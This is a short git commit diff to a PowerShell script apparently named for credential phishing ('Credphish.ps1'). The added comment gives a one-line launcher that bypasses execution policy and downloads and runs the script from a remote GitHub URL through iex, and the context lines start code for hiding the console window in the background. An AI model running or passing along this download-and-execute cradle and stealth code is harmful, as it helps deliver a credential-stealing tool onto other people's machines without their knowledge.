a7d0ac89014db5292956f9b583fe6164772c894f
ƧÅƝǩƯ <84743508+IAMinZoho@users.noreply.github.com>
2022-09-16 05:28:11 +0530

    Update Credphish.ps1

--- Credphish.ps1
+++ Credphish.ps1
@@ -1,3 +1,6 @@
+#IEX:
+#Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Girism/main/Credphish.ps1'))
+
 # .Net methods for hiding/showing the console in the background
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
